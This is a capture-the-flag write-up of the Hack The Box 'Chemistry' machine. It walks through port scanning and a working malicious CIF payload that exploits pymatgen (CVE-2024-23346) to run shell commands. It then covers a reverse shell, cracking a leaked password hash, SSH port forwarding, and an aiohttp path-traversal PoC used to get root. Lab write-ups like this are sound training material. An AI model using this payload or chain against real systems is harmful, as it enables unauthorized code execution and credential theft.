
starting with some nmap 

```
nmap -p- -sV -sS -Pn -v -oN nmap.txt -T5 10.10.11.38

Nmap scan report for 10.10.11.38
Host is up (0.083s latency).
Not shown: 64405 closed tcp ports (reset), 1128 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
5000/tcp open  http    Werkzeug httpd 3.0.3 (Python 3.9.5)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

some http server on port 5000 



<img src="https://raw.githubusercontent.com/Baga6312/HTB-Writeups/refs/heads/main/machines/chemistry/img/Pasted%20image%2020250130045656.png">


its some CIF file analyser 

<img src="assets/Pasted image 20250130040249.png">

registering will redirect us to this page .. which without further investigating appears that we can exploit it with some reverse shell and access the server 

<img src="assets/Pasted image 20250130045656.png">

but we get some endpoints  `/upload`  , more investigating with burpsuite 

<img src="assets/Pasted image 20250130050214.png">

ig it only accepts `.cif` files 
# Analyse the .cif format file 

after some googling , found that u can actually have an RCE with a .cif file [ (CVE-2024-23346)](https://www.vicarius.io/vsociety/posts/critical-security-flaw-in-pymatgen-library-cve-2024-23346)
parsing a # transformation_string can give us a way to some internal built_in python function 

lets test the vurnability first : 
we have `example.cif` and we will add the exploit at the end 
```
data_5yOhtAoR
_audit_creation_date            2018-06-08
_audit_creation_method          "Pymatgen CIF Parser Arbitrary Code Execution Exploit"

loop_
_parent_propagation_vector.id
_parent_propagation_vector.kxkykz
k1 [0 0 0]

_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("touch pwned");0,0,0'


_space_group_magn.number_BNS  62.448
_space_group_magn.name_BNS  "P  n'  m  a'  "
```

the actual arbitrary code call  

now lets fire up some PoC python script `exploit.py`

```
from pymatgen.io.cif import CifParser
parser = CifParser("vuln.cif")
structure = parser.parse_structures()
```

install the pymatgen library and run the script 

```
pip3 install pymatgen 
python3 exploit.py 
```

NOTE : many of u will try to execute the script but nothing will pop out , the reason of that cuz using a pacthed version of pymatgen .. make sure to install the the unpatched version when testing the exploit 

```
pip3 install pymatgen=2024.2.8 --break-system-packages 
```

voila 

<img src="assets/Pasted image 20250130061141.png">

now we can generate a reverse shell with https://www.revshells.com/ 

<img src="assets/Pasted image 20250130061407.png">

we upload the file with the reverse shell and now we have a shell 

<img src="assets/Pasted image 20250130062638.png">

upgrade from simple shell to an interactive shell (Recommanded in every machine u play )

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

now we get to the real work . we have rosa user and ofc we dont have permession for the home folder 

<img src="assets/Pasted image 20250130063429.png">

and we have a `database.db` file under instance .. lets try it 

<img src="assets/Pasted image 20250130064817.png">

list of hashes and hash of rosa among them , ill c rack it with crackstation cuz its easy and online 

<img src="assets/Pasted image 20250130064935.png">

we have password , lets validate it 

<img src="assets/Pasted image 20250130065305.png">

rosa:unicorniosrosados 
user.txt : 701936ae5503aa56dffdf9646166e79b 
# Privilege Escalation 
lets elevate our writes to root for the root flag 

<img src="assets/Pasted image 20250130065612.png">

i would like to try some linpease but its soo verbose and theres so many output ..  so ill skip to the result 

in the /opt folder theres a `monitoring_site`  we dont have the right to it cuz its under root .. thats a good thing .. so we have to find a way to it . 
theres smthing running localy on port 8080 

<img src="assets/Pasted image 20250130070243.png">

forward it to ur local machine 

```
ssh -L 8080:localhost:8080 rosa@10.10.11.38
```

<img src="assets/Pasted image 20250130070508.png">

enumerating this monitoring website . maybe we can find something . since the folder under root user so it must run under root 

<img src="assets/Pasted image 20250130071853.png">

aiohttp/3.9.1 server 
after some digging i found an exploit for that (https://github.com/z3rObyte/CVE-2024-23334-PoC) 

```
pip3 install -r requirements.txt
python3 server.py
bash exploit.sh
```

and we have root 




root.txt :  




[[machines]]
